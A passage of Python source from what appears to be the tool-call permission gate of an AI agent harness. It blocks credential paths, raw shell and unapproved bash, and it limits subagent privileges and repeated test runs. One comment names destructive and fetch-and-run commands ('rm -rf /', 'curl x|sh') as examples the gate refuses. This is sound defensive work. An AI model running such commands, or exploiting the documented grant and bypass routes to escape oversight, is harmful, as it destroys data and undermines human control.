            return _sec012_finalize(
                ToolDecision(
                    allowed=False,
                    reason=DISABLED_TOOLS[_norm_disabled],
                    blocked_by="todowrite_disabled"
                    if _norm_disabled == "todowrite"
                    else f"{_norm_disabled}_disabled",
                ),
            )
        _sec012_trace.add("disabled_tools", "pass")

        managed = self.hub.managed_mode.get_mode(project_root)
        _sec012_trace.managed_mode_active = bool(managed.get("active"))
        _sec012_trace.session_id = str(managed.get("session_id") or "")

        if not managed.get("active"):
            # Authoritative AIDOCS-project detection: marker file
            # (.MEMORY/.aidocs/index.aidocs), not bare .MEMORY/ dir.
            # A plain .MEMORY/ can be created by stray mkdir side
            # effects (e.g. pytest fixtures run with a different cwd)
            # and incorrectly trigger the "AIDOCS project detected
            # but managed mode is not active" block on subdirs that
            # aren't actually AIDOCS-managed. Match find_aidocs_project_root's
            # contract so the gate and the resolver agree on what an
            # AIDOCS project IS. (2026-04-24 flap fix.)
            from .mcp_server_runtime_helpers import is_aidocs_managed

            if is_aidocs_managed(project_root):
                # Normalize tool name once. CC prefixes MCP tools with
                # mcp__aidocs__; both prefixed and bare should be
                # treated equally against the allowlists.
                normalized = tool_name.strip().lower()
                for prefix in ("mcp__aidocs__", "mcp__"):
                    if normalized.startswith(prefix):
                        normalized = normalized[len(prefix) :]
                        break
                if normalized not in SYSTEM_TOOLS and normalized not in BOOTSTRAP_TOOLS:
                    _sec012_trace.add(
                        "managed_mode_gate",
                        "block",
                        normalized=normalized,
                        reason="managed_mode_inactive",
                    )
                    return _sec012_finalize(
                        ToolDecision(
                            allowed=False,
                            reason="AIDOCS project detected but managed mode is not active. Run /aidocs first to bind a session.",
                            blocked_by="managed_mode_inactive",
                        ),
                    )
            _sec012_trace.add(
                "managed_mode_gate",
                "pass",
                note="managed mode inactive but not AIDOCS project (or system/bootstrap tool)",
            )
            return _sec012_finalize(ToolDecision(allowed=True))

        _sec012_trace.add("managed_mode_gate", "pass")

        if tool_name.strip().lower() in SYSTEM_TOOLS:
            _sec012_trace.add("system_tools", "bypass")
            return _sec012_finalize(ToolDecision(allowed=True))

        # ─── SEC-004 (2026-04-23) path trust-zone enforcement ────────
        # Classify the target path BEFORE the external-path bypass
        # (which otherwise lets ANYTHING outside project through).
        # Sensitive external (SSH, AWS creds) → hard deny; unknown
        # external → deny with escalation hint; approved/internal
        # zones fall through to existing gate stack.
        try:
            raw_target = _extract_path(tool_input)
            if raw_target:
                from .path_trust_zone import PathTrustZone, classify_path

                # Read approved_external_roots from resolved effective
                # config. Inlined read (config resolve happens later
                # in check_tool) so we don't defer zone enforcement.
                try:
                    _effective_early = _effective()
                    _sec_cfg = (
                        _effective_early.get("security", {})
                        if isinstance(_effective_early, dict)
                        else {}
                    ) or (
                        _effective_early.get("gate", {})
                        if isinstance(_effective_early, dict)
                        else {}
                    )
                    _approved = _sec_cfg.get("approved_external_roots") or []
                    if not isinstance(_approved, list):
                        _approved = []
                except Exception:
                    _approved = []
                zone = classify_path(
                    raw_target,
                    project_root=project_root,
                    approved_external_roots=[str(r) for r in _approved if str(r).strip()],
                )
                session_id_for_event = str(managed.get("session_id") or "").strip()
                if zone == PathTrustZone.BLOCKED_SENSITIVE_EXTERNAL:
                    # Carve-out: THIS session's own task/deploy output lives
                    # under <TEMP>/claude/<slug>/<uuid>/tasks/ — i.e. under
                    # AppData, which the zone classifier flags sensitive. For a
                    # READ-family tool, if the path is the current session's
                    # FRESH task artifact (bound to project + session-UUID +
                    # freshness), it is the agent's OWN output, not a secret —
                    # let the read proceed (it still flows through the canonical
                    # host-read law below). Everything else under a sensitive
                    # home dir stays hard-blocked + strikes (no carve-out for
                    # writes, other sessions, other projects, stale, or secrets).
                    _task_read_ok = False
                    if self._normalized_tool(tool_name) in ("read", "grep", "glob"):
                        try:
                            from .session_artifact import is_session_task_artifact

                            _task_read_ok = is_session_task_artifact(
                                raw_target,
                                project_root=project_root,
                                host_session_ids=self._host_session_ids(
                                    project_root,
                                    session_id_for_event,
                                ),
                            )
                        except Exception:
                            _task_read_ok = False
                    if not _task_read_ok:
                        _sec012_trace.add(
                            "sec004_path_zone",
                            "block",
                            zone=str(zone),
                            path=raw_target,
                        )
                        self._record_event(
                            project_root,
                            "path_zone_block",
                            tool_name,
                            "blocked",
                            session_id=session_id_for_event,
                            reason=f"sensitive: {raw_target}",
                        )
                        _sv = self._security_strike(
                            project_root,
                            session_id_for_event,
                            "blocked_sensitive_external",
                            tool_name,
                            raw_target,
                        )
                        return _sec012_finalize(
                            ToolDecision(
                                allowed=False,
                                reason=self._augment_reason(
                                    f"Path `{raw_target}` is in a sensitive "
                                    "zone (SSH/cloud creds/home config). Hard "
                                    "block — operator cannot lift via prompt.",
                                    _sv,
                                ),
                                blocked_by="sensitive_path_blocked",
                            ),
                        )
                    _sec012_trace.add(
                        "sec004_path_zone",
                        "pass",
                        zone=str(zone),
                        path=raw_target,
                        note="session_task_artifact",
                    )
                if zone == PathTrustZone.UNKNOWN_EXTERNAL:
                    # One-law goal 2026-05-20: for normal-host Read the
                    # canonical host-read law owns the external decision.
                    # A path recorded as a session artifact (or under an
                    # approved root) and non-sensitive is readable — the
                    # PathTrustZone classifier doesn't know about
                    # session_artifact_paths, so consult host_read_decision
                    # BEFORE blocking. (Sensitive external already
                    # hard-blocked above; host_read_decision also refuses
                    # secrets, so this can never open one.)
                    _read_artifact_ok = False
                    if self._normalized_tool(tool_name) == "read":
                        try:
                            from .access_gate import host_read_decision

                            _sid = str(managed.get("session_id") or "").strip()
                            _st = self.hub.query_gate.get(project_root, _sid) if _sid else {}
                            _gs = dict(_st) if isinstance(_st, dict) else {}
                            _gs["project_root"] = str(project_root)
                            _gs["approved_external_roots"] = [
                                str(r) for r in _approved if str(r).strip()
                            ]
                            _gs["host_session_ids"] = self._host_session_ids(
                                project_root,
                                _sid,
                            )
                            _read_artifact_ok = host_read_decision(
                                _gs,
                                raw_target,
                            ).allowed
                        except Exception:
                            _read_artifact_ok = False
                    if not _read_artifact_ok:
                        _sec012_trace.add(
                            "sec004_path_zone",
                            "block",
                            zone=str(zone),
                            path=raw_target,
                        )
                        self._record_event(
                            project_root,
                            "path_zone_block",
                            tool_name,
                            "blocked",
                            session_id=session_id_for_event,
                            reason=f"unknown_external: {raw_target}",
                        )
                        _sv = self._security_strike(
                            project_root,
                            session_id_for_event,
                            "unknown_external",
                            tool_name,
                            raw_target,
                        )
                        return _sec012_finalize(
                            ToolDecision(
                                allowed=False,
                                reason=self._augment_reason(
                                    f"Path `{raw_target}` is outside project "
                                    "root and not in approved_external_roots. "
                                    "Add to security.approved_external_roots "
                                    "(dashboard) or request admin escalation.",
                                    _sv,
                                ),
                                blocked_by="unknown_external_path",
                            ),
                        )
                    _sec012_trace.add(
                        "sec004_path_zone",
                        "pass",
                        zone=str(zone),
                        path=raw_target,
                        note="host_read_artifact_allow",
                    )
                _sec012_trace.add(
                    "sec004_path_zone",
                    "pass",
                    zone=str(zone),
                    path=raw_target,
                )
        except Exception:
            # Classifier failure must not crash the gate — fall
            # through to existing rules. Visible via SEC-014 cleanup.
            _sec012_trace.add("sec004_path_zone", "skip", reason="classifier_error")

        # External path bypass — files outside the project skip the raw tool gate
        # (infrastructure protection and judge still run)
        target_path = _extract_path(tool_input).replace("\\", "/")
        if target_path:
            try:
                target_obj = Path(target_path)
                if target_obj.is_absolute():
                    resolved_target = target_obj.resolve()
                    resolved_root = project_root.resolve()
                    if not str(resolved_target).startswith(str(resolved_root)):
                        # Outside project — allow raw tools, but still run judge for bash
                        if tool_name.lower() == "bash":
                            from .heuristic_judge import evaluate_tool_call

                            judge = evaluate_tool_call(
                                tool_name,
                                tool_input,
                                project_root=project_root,
                            )
                            if judge.should_block:
                                top = judge.verdicts[0]
                                _sec012_trace.add(
                                    "heuristic_judge",
                                    "block",
                                    rule_id=str(getattr(top, "rule_id", "") or ""),
                                    risk=str(getattr(top, "risk", "") or ""),
                                )
                                return _sec012_finalize(
                                    ToolDecision(
                                        allowed=False,
                                        reason=f"Risk assessment: {top.description}"
                                        + (f" {top.recommendation}" if top.recommendation else ""),
                                        blocked_by="heuristic_judge",
                                    ),
                                )
                            _sec012_trace.add(
                                "heuristic_judge",
                                "pass",
                                note="external_path_bypass",
                            )
                        # One-law goal 2026-05-20: normal-host Read of an
                        # outside-project path must still obey the canonical
                        # host-read law. The blanket bypass would otherwise
                        # open a sensitive external file that PathTrustZone
                        # did not classify (its sensitive set is narrower than
                        # host_read_decision's). Route read through the law;
                        # allow only on a positive host-read allow.
                        if self._normalized_tool(tool_name) == "read":
                            from .access_gate import host_read_decision

                            _sid = str(managed.get("session_id") or "").strip()
                            try:
                                _st = self.hub.query_gate.get(project_root, _sid) if _sid else {}
                            except Exception:
                                _st = {}
                            _gs = dict(_st) if isinstance(_st, dict) else {}
                            _gs["project_root"] = str(project_root)
                            _gs["host_session_ids"] = self._host_session_ids(
                                project_root,
                                _sid,
                            )
                            try:
                                _eff = _effective()
                                _sc = (
                                    _eff.get("security", {}) if isinstance(_eff, dict) else {}
                                ) or {}
                                _rts = _sc.get("approved_external_roots") or []
                                if isinstance(_rts, list):
                                    _gs["approved_external_roots"] = [
                                        str(r) for r in _rts if str(r).strip()
                                    ]
                            except Exception:
                                pass
                            _hr = host_read_decision(_gs, target_path)
                            if not _hr.allowed:
                                _sec012_trace.add(
                                    "external_path_bypass",
                                    "block",
                                    path=str(resolved_target),
                                    level=_hr.level,
                                )
                                _sid_hr = str(managed.get("session_id") or "").strip()
                                self._record_event(
                                    project_root,
                                    "raw_tool_block",
                                    tool_name,
                                    "blocked",
                                    session_id=_sid_hr,
                                    reason=_hr.reason,
                                )
                                _hr_family = (
                                    "blocked_sensitive_external"
                                    if _hr.level == "sensitive_file_protection"
                                    else "unknown_external"
                                )
                                _sv = self._security_strike(
                                    project_root,
                                    _sid_hr,
                                    _hr_family,
                                    tool_name,
                                    target_path,
                                )
                                return _sec012_finalize(
                                    ToolDecision(
                                        allowed=False,
                                        reason=self._augment_reason(
                                            _hr.reason
                                            or "Host read refused by AIDOCS read policy.",
                                            _sv,
                                        ),
                                        blocked_by="host_read",
                                    ),
                                )
                            _sec012_trace.add(
                                "external_path_bypass",
                                "bypass",
                                path=str(resolved_target),
                                note="host_read_external_allow",
                            )
                            return _sec012_finalize(ToolDecision(allowed=True))
                        _sec012_trace.add(
                            "external_path_bypass",
                            "bypass",
                            path=str(resolved_target),
                        )
                        return _sec012_finalize(ToolDecision(allowed=True))
            except Exception:
                pass

        session_id = str(managed.get("session_id") or "").strip()

        # Resolve config early so tier-0 gates (edit-redirect, test-retry)
        # can read operator-set keys before any other gate runs.
        effective = _effective()
        dev_config = effective.get("dev", {}) if isinstance(effective, dict) else {}
        # Config section renamed 2026-04-22: `gate.*` → `security.*`.
        # Read from the new key; fall back to legacy key so TOML files
        # that still have a [gate] block (pre-migration) keep working
        # until the operator re-exports.
        gate_config = (effective.get("security", {}) if isinstance(effective, dict) else {}) or (
            effective.get("gate", {}) if isinstance(effective, dict) else {}
        )
        agents_config = effective.get("agents", {}) if isinstance(effective, dict) else {}

        # ─── Self-approve confirm lift (#39) ────────────────────────
        # If the operator just confirmed this EXACT action via the freeze
        # phrase, a single-use confirm grant is waiting. Consume it here,
        # before any deny/confirmable evaluation, so the identical retry
        # passes exactly once. A different command or a spent grant finds
        # nothing and falls through to the normal gate (re-freeze) — no
        # loop, no broad lift (the grant is bound to this fingerprint).
        # Runs BEFORE _sec003_match_and_consume so its additive-only
        # match cannot swallow the confirm grant on the lifting attempt.
        _confirm_tool = tool_name.strip().lower()
        for _pfx in ("mcp__aidocs__", "mcp__"):
            if _confirm_tool.startswith(_pfx):
                _confirm_tool = _confirm_tool[len(_pfx) :]
                break
        if session_id and _confirm_tool in ("bash", "ai_run"):
            try:
                from .freeze_service import consume_confirm_grant_if_matching

                if consume_confirm_grant_if_matching(
                    project_root,
                    session_id=session_id,
                    tool_name=tool_name,
                    tool_input=tool_input or {},
                ):
                    self._journal_bash_decision(
                        project_root,
                        session_id,
                        str((tool_input or {}).get("command", "")),
                        "allow",
                        "self-approve confirm grant consumed (retry-once)",
                    )
                    _sec012_trace.add("confirm_grant_lift", "bypass")
                    return _sec012_finalize(
                        ToolDecision(
                            allowed=True,
                            advisory="Operator-confirmed action — single-use "
                            "approval consumed; this retry passes once.",
                        ),
                    )
            except Exception:
                _sec012_trace.add("confirm_grant_lift", "skip", reason="lift_error")

        # ─── SEC-003 (2026-04-23) match-and-consume ─────────────────
        # At tool-call time, check whether any pending admin-approved
        # grant binds to the attempted action (tool + path + task_id
        # + optional command_hash). Consume on match.
        #
        # Fires BEFORE tier-0 redirects so the attempt registers even
        # when the action would later be blocked — spec says "consume
        # only when matching action attempted," and attempt = agent
        # called the tool. A match here records that the approval was
        # used for this attempt. Whether the attempt SUCCEEDS is a
        # separate question handled by downstream gates.
        #
        # This is additive-only: we NEVER change the downstream
        # decision here; consume just records the match. The legacy
        # escalation_hook.check_live_grant_or_bubble path still
        # governs whether the grant's permission lifts any block —
        # that wiring is untouched to avoid re-entering the SEC-003
        # scope-lift territory that's out of spec.
        try:
            self._sec003_match_and_consume(
                project_root=project_root,
                session_id=session_id,
                tool_name=tool_name,
                tool_input=tool_input or {},
            )
            _sec012_trace.add("sec003_match_consume", "pass")
        except Exception:
            _sec012_trace.add("sec003_match_consume", "skip", reason="consume_error")

        # Tier-0 edit-redirect: fires before user_granted, dev_mode, and
        # gate_enforce bypass paths. Raw edits would silently stale the
        # AIDOCS index and break inter-lane consistency. Unblock only
        # via dashboard-set `security.allow_raw_edits` — NLP grants are not
        # accepted because "edit" is an everyday verb.
        allow_raw_edits = bool(gate_config.get("allow_raw_edits", False))
        edit_redirect = AccessGate.check_edit_redirect(
            GateContext(
                managed=bool(managed.get("active")),
                session_id=session_id,
                dev_mode=False,
                allow_config_edit=False,
                gate_enforce=True,
                gate_state={},
            ),
            tool_name,
            allow_raw_edits=allow_raw_edits,
            tool_input=tool_input,
            project_root=project_root,
        )
        if edit_redirect.advisory:
            _sec012_trace.add(
                "tier0_edit_redirect",
                "bypass",
                reason="operator_unblock",
            )
            self._record_event(
                project_root,
                "edit_redirect_unblocked",
                tool_name,
                "observed",
                session_id=session_id,
                reason="operator unblock via security.allow_raw_edits",
            )
        elif not edit_redirect.allowed:
            _sec012_trace.add(
                "tier0_edit_redirect",
                "block",
                reason=str(edit_redirect.reason or ""),
            )
            self._record_event(
                project_root,
                "edit_redirect_block",
                tool_name,
                "blocked",
                session_id=session_id,
                reason=edit_redirect.reason,
            )
            return _sec012_finalize(
                ToolDecision(
                    allowed=False,
                    reason=edit_redirect.reason
                    or f"Tool `{tool_name}` blocked by tier-0 edit redirect.",
                    blocked_by="tier0_edit_redirect",
                ),
            )
        else:
            _sec012_trace.add("tier0_edit_redirect", "pass")

        # User-intent grant: lifts raw-tool blocks for this turn but does
        # NOT bypass the destructive-command guards below (bash denylist
        # + allowlist + heuristic judge). Computed BEFORE tier-0
        # raw-shell so "I allow bash" can unblock raw Bash when ai_run
        # can't run the command (test retry loop, etc.). Deny/judge
        # still fire downstream so destructive commands stay blocked.
        user_granted = False
        if session_id:
            user_intent_tools = self.hub.query_gate.get_user_intent_tools(project_root, session_id)
            if tool_name.lower() in user_intent_tools:
                user_granted = True
        # 2026-04-25: sticky_grant_activated event emission removed.
        # Sticky grants are persistent state, not per-turn events;
        # there is no clean "activation moment" worth a dedicated
        # event_kind. Forensic question "this tool ran while sticky
        # X was active" is reconstructable from the existing tool_call
        # audit chain joined with active_grants_for_session at the
        # observed_at timestamp. See .MEMORY/system/security-gates.md
        # section 8 (audit emission) for the full event taxonomy.
        _sec012_trace.add(
            "user_intent_tools",
            "bypass" if user_granted else "pass",
            granted=user_granted,
        )

        # Tier-0 raw-shell redirect — raw Bash routes around ai_run's
        # journal audit trail. Two unblock paths:
        #   - security.allow_raw_shell dashboard flag (persistent).
        #   - user_granted (per-turn "I allow bash" NLP grant).
        # Both return advisory=True so the bypass is recorded in the
        # event stream; bash_policy + judge still fire downstream.
        allow_raw_shell = bool(gate_config.get("allow_raw_shell", False))
        # AIDOCS shell provider lock — Batch B deprecation (canonical
        # 2026-05-23, lands the behavior change flagged in Batch A
        # 2026-04-29). security.allow_raw_shell is now IGNORED in managed
        # AIDOCS sessions per the shell-provider-lock invariant: host-
        # native shell stays T0-blocked regardless of the flag, and the
        # supported native path is Governed Bash (ai_run remains the
        # canonical fallback). When the deprecated flag is set True in a
        # managed session we neutralize it (force False) and emit a
        # deprecated_setting_used event redirecting to Governed Bash so
        # operators see it in the dashboard event feed.
        if allow_raw_shell and managed.get("active"):
            allow_raw_shell = False  # Batch B: the flag no longer unblocks
            try:
                self.hub.execution.record_event(
                    project_root,
                    event_kind="deprecated_setting_used",
                    source_kind="agent_orchestrator.check_tool",
                    session_id=session_id or None,
                    capability_name="security.allow_raw_shell",
                    action_kind="config_read",
                    target_entity="security.allow_raw_shell",
                    status="ignored",
                    payload={
                        "setting": "security.allow_raw_shell",
                        "value": True,
                        "managed_mode": True,
                        "ignored": True,
                        "deprecation_message": (
                            "security.allow_raw_shell is DEPRECATED and is "
                            "now ignored in managed AIDOCS sessions. Host-"
                            "native shell tools remain T0-blocked. For "
                            "governed native shell use Governed Bash "
                            "(`aidocs governed-bash-enable`); otherwise use "
                            "ai_run with the Bash provider."
                        ),
                    },
                )
            except Exception:
                pass
        raw_shell = AccessGate.check_raw_shell(
            GateContext(
                managed=bool(managed.get("active")),
                session_id=session_id,
                dev_mode=False,
                allow_config_edit=False,
                gate_enforce=True,
                gate_state={},
            ),
            tool_name,
            allow_raw_shell=allow_raw_shell,
            user_granted=user_granted,
        )
        if raw_shell.advisory:
            bypass_reason = (
                "operator unblock via security.allow_raw_shell"
                if raw_shell.level == "raw_shell_operator_unblocked"
                else "per-turn user_intent grant"
            )
            _sec012_trace.add(
                "tier0_raw_shell",
                "bypass",
                reason=raw_shell.level,
            )
            self._record_event(
                project_root,
                "raw_shell_unblocked",
                tool_name,
                "observed",
                session_id=session_id,
                reason=bypass_reason,
            )
        elif not raw_shell.allowed:
            _sec012_trace.add(
                "tier0_raw_shell",
                "block",
                reason=str(raw_shell.reason or ""),
            )
            self._record_event(
                project_root,
                "raw_shell_block",
                tool_name,
                "blocked",
                session_id=session_id,
                reason=raw_shell.reason,
            )
            _sv = self._security_strike(
                project_root,
                session_id,
                "raw_shell_t0",
                tool_name,
                str((tool_input or {}).get("command", "")),
            )
            return _sec012_finalize(
                ToolDecision(
                    allowed=False,
                    reason=self._augment_reason(
                        raw_shell.reason
                        or f"Tool `{tool_name}` blocked by tier-0 raw-shell redirect.",
                        _sv,
                    ),
                    blocked_by="tier0_raw_shell",
                ),
            )
        else:
            _sec012_trace.add("tier0_raw_shell", "pass")

        # Tool policies
        from .tool_policy import evaluate_tool as _eval_policy

        policy = _eval_policy(project_root, tool_name)
        if policy.blocked:
            _sec012_trace.add(
                "tool_policy",
                "block",
                reason=str(policy.reason or ""),
            )
            self._record_event(
                project_root,
                "tool_policy_block",
                tool_name,
                "blocked",
                session_id=session_id,
                reason=policy.reason,
            )
            return _sec012_finalize(
                ToolDecision(
                    allowed=False,
                    reason=policy.reason or f"Tool `{tool_name}` blocked by project policy.",
                    blocked_by="tool_policy",
                ),
            )
        _sec012_trace.add("tool_policy", "pass")

        # PRIVILEGE ISOLATION (hardened 2026-05-19): lane agents AND
        # subagents never receive conductor dev_mode. Detection now
        # uses THREE independent signals so a Task-dispatched subagent
        # whose session_query_gate has no current_lane_id (the lane
        # is on the conductor's row, not the worker's) is still caught:
        #
        #   1. ``current_lane_id`` on the caller's session_query_gate
        #      row — catches lane agents whose gate has been stamped.
        #   2. ``principal_type='subagent'`` from IdentityResolver,
        #      keyed off AIDOCS_EXPERT_LANE_ID in the worker's env.
        #      Unambiguous: a process spawned with the lane-worker env
        #      is a subagent regardless of its own gate state.
        #   3. ``is_sub_agent_latched()`` runtime flag set by
        #      auto_bind_lane_worker_managed_mode. One-way latch the
        #      worker process cannot clear.
        #
        # ANY of the three triggers privilege-down. Pre-fix only signal
        # #1 was checked, so subagents whose gate row didn't carry the
        # lane id inherited conductor dev_mode — exactly the bugs.md
        # "CRITICAL: dev_mode leaks to subagents" finding.
        is_lane_agent = False
        is_subagent_principal = False
        is_subagent_latched = False
        current_lane_id = ""
        if session_id:
            gate_state = self.hub.query_gate.get(project_root, session_id)
            current_lane_id = str(gate_state.get("current_lane_id") or "").strip()
            is_lane_agent = bool(current_lane_id)
        try:
            from .identity_resolver import current_user

            _uid, _email, principal_type = current_user(project_root)
            is_subagent_principal = principal_type == "subagent"
        except Exception:
            is_subagent_principal = False
        try:
            from .protected_file_runtime import is_sub_agent_latched

            is_subagent_latched = bool(is_sub_agent_latched())
        except Exception:
            is_subagent_latched = False
        is_privileged_caller = not (is_lane_agent or is_subagent_principal or is_subagent_latched)

        # Test-retry reset marker, scoped to (session, lane). An edit by
        # Lane B must not reset Lane A's counter, and an edit in another
        # session must not reset this one's. Emitted after session+lane
        # are resolved so the scope travels on the event payload.
        if tool_name in _TEST_RETRY_EDIT_TOOLS:
            self._record_test_retry_reset(project_root, session_id, current_lane_id)

        # dev_mode (unlocks AIDOCS source editing) is DERIVED authority
        # (2026-06-12): a dev-flavor install AND project_root IS the
        # canonical AIDOCS source repo. No `dev.dev_mode` config flag and
        # no caller-privilege gate — on a contributor build EVERY agent
        # (conductor or spawned subagent/lane worker) may edit the source,
        # because that IS the dev workflow. A solo/corpo install, or any
        # project that merely uses AIDOCS, can never unlock it.
        from .enforcement import dev_mode_authorized as _dev_mode_authorized

        dev_mode = _dev_mode_authorized(project_root)
        allow_config_edit = (
            bool(dev_config.get("allow_config_edit", False)) and is_privileged_caller
        )
        gate_enforce = bool(gate_config.get("enforce", True))
        allow_subagents = bool(agents_config.get("allow_subagents", False))

        # Raw tool gate — skipped when the user explicitly granted this tool.
        # Pass the resolved gate_state so the discovery-grant branch in
        # check_raw_tool can lift the block for read-only tools whose
        # target path is in known_exact_paths or lane_exact_paths
        # (canonical 2026-04-30: post-discovery raw read is the natural
        # follow-up flow, especially on hosts like OpenCode where the
        # agent's primary read surface IS the raw `read` tool). Pre-fix
        # this passed gate_state={} so the discovery branch never fired.
        if not user_granted:
            # Inject project_root so the canonical host-read law can
            # relativize absolute in-project paths (host_read_decision
            # otherwise treats any absolute path as external).
            _raw_gate_state = dict(gate_state) if session_id else {}
            _raw_gate_state["project_root"] = str(project_root)
            raw = AccessGate.check_raw_tool(
                GateContext(
                    managed=True,
                    session_id=session_id,
                    dev_mode=dev_mode,
                    allow_config_edit=allow_config_edit,
                    gate_enforce=gate_enforce,
                    gate_state=_raw_gate_state,
                ),
                tool_name,
                allow_subagents=allow_subagents,
                tool_input=tool_input,
            )
            if not raw.allowed:
                _sec012_trace.add(
                    "raw_tool_gate",
                    "block",
                    reason=str(raw.reason or ""),
                )
                self._record_event(
                    project_root,
                    "raw_tool_block",
                    tool_name,
                    "blocked",
                    session_id=session_id,
                    reason=raw.reason,
                )
                # Strike only the genuinely security-relevant raw-tool block:
                # a raw read of a SECRET path (sensitive_file_protection).
                # Discovery nudges (indexed_file_gate / read_gate) and the
                # generic managed-mode reroute are workflow guidance, not
                # hostile attempts, so they do NOT increment.
                _raw_sv = None
                if raw.level == "sensitive_file_protection":
                    _raw_sv = self._security_strike(
                        project_root,
                        session_id,
                        "sensitive_file_protection",
                        tool_name,
                        _extract_path(tool_input or {}),
                    )
                return _sec012_finalize(
                    ToolDecision(
                        allowed=False,
                        reason=self._augment_reason(
                            raw.reason or "Blocked by AIDOCS managed mode.",
                            _raw_sv,
                        ),
                        blocked_by="raw_tool",
                    ),
                )
            _sec012_trace.add("raw_tool_gate", "pass")
        else:
            _sec012_trace.add("raw_tool_gate", "bypass", reason="user_intent_tool")

        # Lane tool enforcement — restrict tools when a conductor lane is active
        if is_lane_agent:
            lane_check = AccessGate.check_lane_tool(
                GateContext(
                    managed=True,
                    session_id=session_id,
                    dev_mode=dev_mode,
                    allow_config_edit=allow_config_edit,
                    gate_enforce=gate_enforce,
                    gate_state=gate_state,
                ),
                tool_name,
            )
            if not lane_check.allowed:
                _sec012_trace.add(
                    "lane_comms",
                    "block",
                    reason=str(lane_check.reason or ""),
                    lane_id=current_lane_id,
                )
                self._record_event(
                    project_root,
                    "lane_tool_block",
                    tool_name,
                    "blocked",
                    session_id=session_id,
                    reason=lane_check.reason,
                )
                return _sec012_finalize(
                    ToolDecision(
                        allowed=False,
                        reason=lane_check.reason or f"Tool '{tool_name}' not allowed in this lane.",
                        blocked_by="lane_tool",
                    ),
                )
            _sec012_trace.add("lane_comms", "pass", lane_id=current_lane_id)
        else:
            _sec012_trace.add("lane_comms", "skip", reason="not_lane_agent")

        from .config import get_setting

        # Test-retry gate (tier-0): fires independent of gate_enforce because
        # this is a pedagogical cost-protection nudge, not a security posture.
        # Operators who turn gate_enforce off still want "don't let the agent
        # loop on pytest without fixing anything". State in sqlite
        # (test_runner_invocation + test_retry_reset markers) so wire-doubling
        # from the MCP client can't inflate it — COUNT(DISTINCT event_id)
        # collapses both arrivals of a wire-duplicate.
        # ai_run is the canonical shell surface. Native bash is T0-blocked
        # in managed mode (Invariant #38) — the test below will only fire
        # for ai_run in production. The "bash" alias is kept for unmanaged
        # callers (legacy host paths, freeze-service smoke tests) that
        # still pass that name; under managed mode the tier-0 raw-shell
        # block runs first and prevents bash from reaching here.
        if tool_name.lower() in ("bash", "ai_run"):
            raw_cmd = str((tool_input or {}).get("command", ""))
            if _is_test_runner_invocation(raw_cmd):
                key = _normalize_test_command_key(raw_cmd)
                prior = self._count_test_invocations_since_reset(
                    project_root,
                    session_id,
                    key,
                    lane_id=current_lane_id,
                )
                self._record_test_invocation(project_root, session_id, key, lane_id=current_lane_id)
                # ADVISE-AND-CONTINUE: the 1st/2nd run nudge but DO NOT
                # early-return allow — they fall through the full law cascade
                # (bash policy, dangerous-chain, destructive floor, judge) so a
                # first-time `pytest && rm -rf /` or `pytest $(curl x|sh)` is
                # still refused. The advisory rides on the eventual ALLOW via
                # `_pending_advisories`. Only the unresolved 3rd run early-blocks.
                if prior == 0:
                    _sec012_trace.add("test_retry_gate", "pass", prior=prior, key=key)
                    _pending_advisories.append(
                        "Running verification. If a previous run of these "
                        "same tests already told you what you needed to "
                        "know, the next invocation will be flagged — read "
                        "the failure and address it rather than re-running."
                    )
                elif prior == 1:
                    _sec012_trace.add("test_retry_gate", "pass", prior=prior, key=key)
                    _pending_advisories.append(
                        "Second run of the same verification. A test that "
                        "produced a signal once will produce the same "
                        "signal again — stop repeating it. Diagnose the "
                        "failure in depth and fix the underlying bug, "
                        "regression, or test. Further repetition will be "
                        "refused."
                    )
                else:
                    self._record_event(
                        project_root,
                        "test_retry_block",
                        tool_name,
                        "blocked",
                        session_id=session_id,
                        reason="Test-retry gate: verification repeated without resolution",
                    )
                    self._journal_bash_decision(
                        project_root,
                        session_id,
                        raw_cmd,
                        "block",
                        "test-retry gate",
                    )
                    _sec012_trace.add("test_retry_gate", "block", prior=prior, key=key)
                    return _sec012_finalize(
                        ToolDecision(
                            allowed=False,
                            reason=(
                                "Refused: this verification has already run multiple "
                                "times without the signal being resolved. Re-running "
                                "will not produce a new answer. Diagnose the "
                                "underlying failure — read the assertion, trace the "
                                "code path, identify the actual bug or regression — "
                                "and fix it. Running tests is not a substitute for "
                                "understanding them."
                            ),
                            blocked_by="test_retry",
                        ),
                    )

        # Declarative bash policy. Backlog #7 (2026-04-25): namespace
        # split — raw Bash host tool reads `raw_bash.*`, ai_run reads
        # `bash.*`. Granting `bash.allow.git=true` (for ai_run) does
        # NOT implicitly unlock raw Bash. Both surfaces flow through
        # evaluate_bash_policy with their own config — only the
        # namespace differs. _JUDGE_DENYLIST trumps any allow entry.
        normalized_tool = tool_name.lower()
        if normalized_tool in ("bash", "ai_run") and gate_enforce:
            from .bash_policy import evaluate_bash_policy

            policy_namespace = "bash" if normalized_tool == "ai_run" else "raw_bash"
            bash_policy = get_setting(policy_namespace, project_root=project_root, default=None)
            if not isinstance(bash_policy, dict) or not bash_policy:
                # Single-source contract: with NO declarative [bash]/[raw_bash]
                # table there is no authority to run any bash, so fail CLOSED —
                # never fall back to a legacy substring allowlist or the
                # governed read-only family (even `git status` blocks). A
                # project that nulls the table is opting out of bash entirely.
                _sec012_trace.add("bash_policy", "block", reason="no_declarative_table")
                self._record_event(
                    project_root,
                    "bash_policy_block",
                    tool_name,
                    "blocked",
                    session_id=session_id,
                    reason="No declarative bash policy table configured.",
                    matched_rule="policy.missing_table",
                )
                self._journal_bash_decision(
                    project_root,
                    session_id,
                    str((tool_input or {}).get("command", "")),
                    "block",
                    f"no declarative [{policy_namespace}] table",
                )
                return _sec012_finalize(
                    ToolDecision(
                        allowed=False,
                        reason=(
                            f"Refused: no declarative [{policy_namespace}] policy "
                            "table is configured, so there is no authority to run "
                            "bash. Add the table (dashboard or TOML) to allow "
                            "specific commands."
                        ),
                        blocked_by="bash_policy_missing",
                    ),
                )
            if isinstance(bash_policy, dict):
                # Per-turn user-intent subcommand grants (e.g. "allow psql")
                # flow natively through evaluate_bash_policy: they trump
                # deny-table and default-block, never dangerous-chain or
                # the hardcoded _JUDGE_DENYLIST.
                extras: list[str] = []
                if session_id:
                    try:
                        extras = list(
                            self.hub.query_gate.get_user_intent_bash_subcommands(
                                project_root,
                                session_id,
                            )
                            or [],
                        )
                    except Exception:
                        extras = []
                policy_decision = evaluate_bash_policy(
                    str((tool_input or {}).get("command", "")),
                    bash_policy,
                    user_intent_subcommands=extras or None,
                    workspace_root=str(project_root),
                )
                matched = str(policy_decision.get("matched_rule") or "")
                # bash_policy is enforced for both raw Bash (after T0
